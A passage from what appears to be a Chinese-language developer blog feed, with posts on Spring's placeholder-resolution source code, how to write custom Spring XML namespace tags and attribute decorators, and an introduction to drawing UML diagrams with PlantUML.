&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">							<span class="string">"Circular placeholder reference '"</span> + originalPlaceholder + <span class="string">"' in property definitions"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">// Recursive invocation, parsing placeholders contained in the placeholder key.</span></span><br><span class="line">				placeholder = parseStringValue(placeholder, placeholderResolver, visitedPlaceholders);</span><br><span class="line">				<span class="comment">// Now obtain the value for the fully resolved key...</span></span><br><span class="line">				String propVal = placeholderResolver.resolvePlaceholder(placeholder);</span><br><span class="line">				<span class="keyword">if</span> (propVal == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.valueSeparator != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">int</span> separatorIndex = placeholder.indexOf(<span class="keyword">this</span>.valueSeparator);</span><br><span class="line">					<span class="keyword">if</span> (separatorIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">						String actualPlaceholder = placeholder.substring(<span class="number">0</span>, separatorIndex);</span><br><span class="line">						String defaultValue = placeholder.substring(separatorIndex + <span class="keyword">this</span>.valueSeparator.length());</span><br><span class="line">						propVal = placeholderResolver.resolvePlaceholder(actualPlaceholder);</span><br><span class="line">						<span class="keyword">if</span> (propVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">							propVal = defaultValue;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (propVal != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="comment">// Recursive invocation, parsing placeholders contained in the</span></span><br><span class="line">					<span class="comment">// previously resolved placeholder value.</span></span><br><span class="line">					propVal = parseStringValue(propVal, placeholderResolver, visitedPlaceholders);</span><br><span class="line">					result.replace(startIndex, endIndex + <span class="keyword">this</span>.placeholderSuffix.length(), propVal);</span><br><span class="line">					<span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">						logger.trace(<span class="string">"Resolved placeholder '"</span> + placeholder + <span class="string">"'"</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					startIndex = result.indexOf(<span class="keyword">this</span>.placeholderPrefix, startIndex + propVal.length());</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.ignoreUnresolvablePlaceholders) &#123;</span><br><span class="line">					<span class="comment">// Proceed with unprocessed value.</span></span><br><span class="line">					startIndex = result.indexOf(<span class="keyword">this</span>.placeholderPrefix, endIndex + <span class="keyword">this</span>.placeholderSuffix.length());</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Could not resolve placeholder '"</span> +</span><br><span class="line">							placeholder + <span class="string">"'"</span> + <span class="string">" in string value \""</span> + strVal + <span class="string">"\""</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				visitedPlaceholders.remove(originalPlaceholder);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				startIndex = -<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> result.toString();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>实际解析的代码都在这里：</p>
<ol>
<li>取出placeHolder的名称.</li>
<li>判断有没有循环引用的情况.</li>
<li>递归替换，获取对应的值.</li>
<li>如果值为空，解析默认值.</li>
</ol>
<h3 id="PropertyPlaceholderConfigurer"><a href="#PropertyPlaceholderConfigurer" class="headerlink" title="PropertyPlaceholderConfigurer"></a>PropertyPlaceholderConfigurer</h3><p>应该和上面的类似，抽时间补。</p>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> placeholder </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring自定义标签，使用和源码]]></title>
      <url>http://qsli.github.io/2016/10/23/custom-tag/</url>
      <content type="html"><![CDATA[<h2 id="自定义标签"><a href="#自定义标签" class="headerlink" title="自定义标签"></a>自定义标签</h2><p>Spring中的标签具有很强的扩展性，我们可以很方便的扩展出自己的标签，做出类似下面的标签<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:service</span> <span class="attr">interface</span>=<span class="string">"com.foo.BarService"</span> <span class="attr">ref</span>=<span class="string">"barService"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dubbo:reference</span> <span class="attr">id</span>=<span class="string">"barService"</span> <span class="attr">interface</span>=<span class="string">"com.foo.BarService"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="1-Authoring-the-schema"><a href="#1-Authoring-the-schema" class="headerlink" title="1. Authoring the schema"></a>1. Authoring the schema</h3><p>定义标签的xml描述：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:schema</span> <span class="attr">xmlns</span>=<span class="string">"http://www.mycompany.com/schema/myns"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:beans</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">targetNamespace</span>=<span class="string">"http://www.mycompany.com/schema/myns"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">elementFormDefault</span>=<span class="string">"qualified"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">attributeFormDefault</span>=<span class="string">"unqualified"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:import</span> <span class="attr">namespace</span>=<span class="string">"http://www.springframework.org/schema/beans"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:element</span> <span class="attr">name</span>=<span class="string">"dateformat"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsd:complexType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsd:complexContent</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsd:extension</span> <span class="attr">base</span>=<span class="string">"beans:identifiedType"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsd:attribute</span> <span class="attr">name</span>=<span class="string">"lenient"</span> <span class="attr">type</span>=<span class="string">"xsd:boolean"</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsd:attribute</span> <span class="attr">name</span>=<span class="string">"pattern"</span> <span class="attr">type</span>=<span class="string">"xsd:string"</span> <span class="attr">use</span>=<span class="string">"required"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">xsd:extension</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsd:complexContent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsd:complexType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsd:element</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsd:schema</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>定义了标签里面的属性和属性的类型， 在解析xml的时候spring会进行校验</p>
<h3 id="2-Coding-a-NamespaceHandler"><a href="#2-Coding-a-NamespaceHandler" class="headerlink" title="2. Coding a NamespaceHandler"></a>2. Coding a NamespaceHandler</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.samples.xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.xml.NamespaceHandlerSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyNamespaceHandler</span> <span class="keyword">extends</span> <span class="title">NamespaceHandlerSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        registerBeanDefinitionParser(<span class="string">"dateformat"</span>, <span class="keyword">new</span> SimpleDateFormatBeanDefinitionParser());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要是定义标签的处理类，这里是<code>SimpleDateFormatBeanDefinitionParser</code></p>
<h3 id="3-BeanDefinitionParser"><a href="#3-BeanDefinitionParser" class="headerlink" title="3. BeanDefinitionParser"></a>3. BeanDefinitionParser</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.samples.xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.support.BeanDefinitionBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.xml.AbstractSingleBeanDefinitionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Element;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleDateFormatBeanDefinitionParser</span> <span class="keyword">extends</span> <span class="title">AbstractSingleBeanDefinitionParser</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Class <span class="title">getBeanClass</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SimpleDateFormat<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doParse</span><span class="params">(Element element, BeanDefinitionBuilder bean)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// this will never be null since the schema explicitly requires that a value be supplied</span></span><br><span class="line">        String pattern = element.getAttribute(<span class="string">"pattern"</span>);</span><br><span class="line">        bean.addConstructorArg(pattern);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// this however is an optional property</span></span><br><span class="line">        String lenient = element.getAttribute(<span class="string">"lenient"</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(lenient)) &#123;</span><br><span class="line">            bean.addPropertyValue(<span class="string">"lenient"</span>, Boolean.valueOf(lenient));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该类继承自spring提供的抽象类<code>AbstractSingleBeanDefinitionParser</code>，提供了许多基本的功能，解析标签的方法在<code>doParse</code>中，spring会传入一个标签元素<code>Element</code>和<code>BeanDefinitionBuilder</code>的上下文。</p>
<h3 id="4-Registering-the-handler-and-the-schema"><a href="#4-Registering-the-handler-and-the-schema" class="headerlink" title="4. Registering the handler and the schema"></a>4. Registering the handler and the schema</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─META-INF</span><br><span class="line">        spring.handlers</span><br><span class="line">        spring.schemas</span><br></pre></td></tr></table></figure>
<p><code>spring.handlers</code>中的内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http\://www.mycompany.com/schema/myns=org.springframework.samples.xml.MyNamespaceHandler</span><br></pre></td></tr></table></figure>
<p><code>spring.schemas</code>中内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http\://www.mycompany.com/schema/myns/myns.xsd=org/springframework/samples/xml/myns.xsd</span><br></pre></td></tr></table></figure>
<p>spring在加载这个jar包的时候会自动的从这些文件中解析到我们的配置，当解析到相应的标签的时候就会交给我们定义的解析类来处理。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">myns:dateformat</span> <span class="attr">id</span>=<span class="string">"dateFormat"</span></span></span><br><span class="line"><span class="tag"><span class="attr">pattern</span>=<span class="string">"yyyy-MM-dd HH:mm"</span></span></span><br><span class="line"><span class="tag"><span class="attr">lenient</span>=<span class="string">"true"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Custom-attributes-on-‘normal’-elements"><a href="#Custom-attributes-on-‘normal’-elements" class="headerlink" title="Custom attributes on ‘normal’ elements"></a>Custom attributes on ‘normal’ elements</h2><p>除了自定义标签外，还可以为已有标签装饰一个新的属性</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"checkingAccountService"</span> <span class="attr">class</span>=<span class="string">"com.foo.DefaultCheckingAccountService"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">jcache:cache-name</span>=<span class="string">"checking.account"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- other dependencies here... --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>spring可以让我们单独处理这个<code>jcache:cache-name</code>这个属性。</p>
<h3 id="定义schema"><a href="#定义schema" class="headerlink" title="定义schema"></a>定义schema</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:schema</span> <span class="attr">xmlns</span>=<span class="string">"http://www.foo.com/schema/jcache"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">targetNamespace</span>=<span class="string">"http://www.foo.com/schema/jcache"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">elementFormDefault</span>=<span class="string">"qualified"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:attribute</span> <span class="attr">name</span>=<span class="string">"cache-name"</span> <span class="attr">type</span>=<span class="string">"xsd:string"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsd:schema</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="NamespaceHandler"><a href="#NamespaceHandler" class="headerlink" title="NamespaceHandler"></a>NamespaceHandler</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JCacheNamespaceHandler</span> <span class="keyword">extends</span> <span class="title">NamespaceHandlerSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.registerBeanDefinitionDecoratorForAttribute(<span class="string">"cache-name"</span>,</span><br><span class="line">            <span class="keyword">new</span> JCacheInitializingBeanDefinitionDecorator());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际的调用行为已经被抽象到<code>NamespaceHandlerSupport</code>中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decorates the supplied &#123;<span class="doctag">@link</span> Node&#125; by delegating to the &#123;<span class="doctag">@link</span> BeanDefinitionDecorator&#125; that</span></span><br><span class="line"><span class="comment"> * is registered to handle that &#123;<span class="doctag">@link</span> Node&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> BeanDefinitionHolder <span class="title">decorate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Node node, BeanDefinitionHolder definition, ParserContext parserContext)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> findDecoratorForNode(node, parserContext).decorate(node, definition, parserContext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="BeanDefinitionDecorator"><a href="#BeanDefinitionDecorator" class="headerlink" title="BeanDefinitionDecorator"></a>BeanDefinitionDecorator</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JCacheInitializingBeanDefinitionDecorator</span> <span class="keyword">implements</span> <span class="title">BeanDefinitionDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] EMPTY_STRING_ARRAY = <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> BeanDefinitionHolder <span class="title">decorate</span><span class="params">(Node source, BeanDefinitionHolder holder,</span></span></span><br><span class="line"><span class="function"><span class="params">            ParserContext ctx)</span> </span>&#123;</span><br><span class="line">        String initializerBeanName = registerJCacheInitializer(source, ctx);</span><br><span class="line">        createDependencyOnJCacheInitializer(holder, initializerBeanName);</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createDependencyOnJCacheInitializer</span><span class="params">(BeanDefinitionHolder holder,</span></span></span><br><span class="line"><span class="function"><span class="params">            String initializerBeanName)</span> </span>&#123;</span><br><span class="line">        AbstractBeanDefinition definition = ((AbstractBeanDefinition) holder.getBeanDefinition());</span><br><span class="line">        String[] dependsOn = definition.getDependsOn();</span><br><span class="line">        <span class="keyword">if</span> (dependsOn == <span class="keyword">null</span>) &#123;</span><br><span class="line">            dependsOn = <span class="keyword">new</span> String[]&#123;initializerBeanName&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            List dependencies = <span class="keyword">new</span> ArrayList(Arrays.asList(dependsOn));</span><br><span class="line">            dependencies.add(initializerBeanName);</span><br><span class="line">            dependsOn = (String[]) dependencies.toArray(EMPTY_STRING_ARRAY);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.setDependsOn(dependsOn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">registerJCacheInitializer</span><span class="params">(Node source, ParserContext ctx)</span> </span>&#123;</span><br><span class="line">        String cacheName = ((Attr) source).getValue();</span><br><span class="line">        String beanName = cacheName + <span class="string">"-initializer"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!ctx.getRegistry().containsBeanDefinition(beanName)) &#123;</span><br><span class="line">            BeanDefinitionBuilder initializer = BeanDefinitionBuilder.rootBeanDefinition(JCacheInitializer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            initializer.addConstructorArg(cacheName);</span><br><span class="line">            ctx.getRegistry().registerBeanDefinition(beanName, initializer.getBeanDefinition());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> beanName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="META-INF"><a href="#META-INF" class="headerlink" title="META-INF"></a>META-INF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># in 'META-INF/spring.handlers'</span><br><span class="line">http\://www.foo.com/schema/jcache=com.foo.JCacheNamespaceHandler</span><br><span class="line"># in 'META-INF/spring.schemas'</span><br><span class="line">http\://www.foo.com/schema/jcache/jcache.xsd=com/foo/jcache.xsd</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://docs.spring.io/spring/docs/current/spring-framework-reference/htmlsingle/" rel="external nofollow noopener noreferrer" target="_blank">spring-framework-reference</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 自定义标签 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[plantuml——用编码的方式画UML]]></title>
      <url>http://qsli.github.io/2016/10/16/plantuml/</url>
      <content type="html"><![CDATA[<h2 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h2><blockquote>
<p>PlantUML is a component that allows to quickly write :</p>
</blockquote>
<blockquote>
<ul>
<li>Sequence diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Usecase diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Class diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Activity diagram, (here is the new syntax),</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Component diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>State diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Deployment diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Object diagram.</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>wireframe graphical interface</li>
</ul>
</blockquote>
<blockquote>
<p>Diagrams are defined using a simple and intuitive  language. ( see PlantUML Language Reference Guide).</p>
</blockquote>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123;% plantuml %&#125;</span><br><span class="line">skinparam backgroundColor #EEEBDC</span><br><span class="line">skinparam handwritten true</span><br><span class="line"></span><br><span class="line">skinparam sequence &#123;</span><br><span class="line">	ArrowColor DeepSkyBlue</span><br><span class="line">	ActorBorderColor DeepSkyBlue</span><br><span class="line">	LifeLineBorderColor blue</span><br><span class="line">	LifeLineBackgroundColor #A9DCDF</span><br><span class="line"></span><br><span class="line">	ParticipantBorderColor DeepSkyBlue</span><br><span class="line">	ParticipantBackgroundColor DodgerBlue</span><br><span class="line">	ParticipantFontName Impact</span><br><span class="line">	ParticipantFontSize 17</span><br><span class="line">	ParticipantFontColor #A9DCDF</span><br><span class="line"></span><br><span class="line">	ActorBackgroundColor aqua</span><br><span class="line">	ActorFontColor DeepSkyBlue</span><br><span class="line">	ActorFontSize 17</span><br><span class="line">	ActorFontName Aapex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">actor User</span><br><span class="line">participant &quot;First Class&quot; as A</span><br><span class="line">participant &quot;Second Class&quot; as B</span><br><span class="line">participant &quot;Last Class&quot; as C</span><br><span class="line"></span><br><span class="line">User -&gt; A: DoWork</span><br><span class="line">activate A</span><br><span class="line"></span><br><span class="line">A -&gt; B: Create Request</span><br><span class="line">activate B</span><br><span class="line"></span><br><span class="line">B -&gt; C: DoWork</span><br><span class="line">activate C</span><br><span class="line">C --&gt; B: WorkDone</span><br><span class="line">destroy C</span><br><span class="line"></span><br><span class="line">B --&gt; A: Request Created</span><br><span class="line">deactivate B</span><br><span class="line"></span><br><span class="line">A --&gt; User: Done</span><br><span class="line">deactivate A</span><br><span class="line"></span><br><span class="line">&#123;% endplantuml %&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码的效果如下：</p>
<img src="http://www.plantuml.com/plantuml/svg/TP8zJyCm48Rdtg-mojo12T41oNPQ2Qb2Y0enN-EZM6djzEnG2kA_4wSL-OBrdlShLY0KrfN8k1SRp8ij-yePxNUUnTLYiL2PXbRnXiuSsSP8JaIk23eiqA4YbvFuWebaziTpI4PKhekJsjNgYSoZP-NP4Fz1L_QLLjPHLx3fa-52UPlfR0amUKIEDhSbklXlVbSp2CgysHAFP4lluWFkITplIypZYAtj9udhcz5zkExytODEF5HuGQrd_5ozdjzBiqfYIH_m3O3fB9u3CPJj4Z5TMWvHw1s6C1KOXEpZDUNUcGvNVRx2dbi3f0enknDoNZ_PY-SYLTjtZFKO09cGcWlDb2vFwOy8iPKe09KaUkpMeCNix4uWyux0r6RsfzIh6bYtNZ8l5QRMTDDb8qiZKqCJqTdt0m00">
<h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><p>可以在chromeapp中找到： <a href="https://chrome.google.com/webstore/detail/uml-diagram-editor/hoepdgfgogmeofkgkpapbdpdjkplcode?utm_source=chrome-ntp-icon" rel="external nofollow noopener noreferrer" target="_blank">链接</a>, 开箱即用</p>
<p>另可以和idea和eclipse、atom等编辑器集成，hexo中也有相应的插件，具体可看下面的教程</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://skyao.github.io/2014/12/05/plantuml-installation/index.html" rel="external nofollow noopener noreferrer" target="_blank">(记录)plantuml安装配置</a></p>
</li>
<li><p><a href="http://keyun.ml/2016/07/25/2016-07-25-hexo-uml.html" rel="external nofollow noopener noreferrer" target="_blank">Hexo博客中的绘图</a></p>
</li>
<li><p><a href="http://plantuml.com/" rel="external nofollow noopener noreferrer" target="_blank">官网</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> uml </tag>
            
        </tags>
        
    </entry>
    
    <entry>
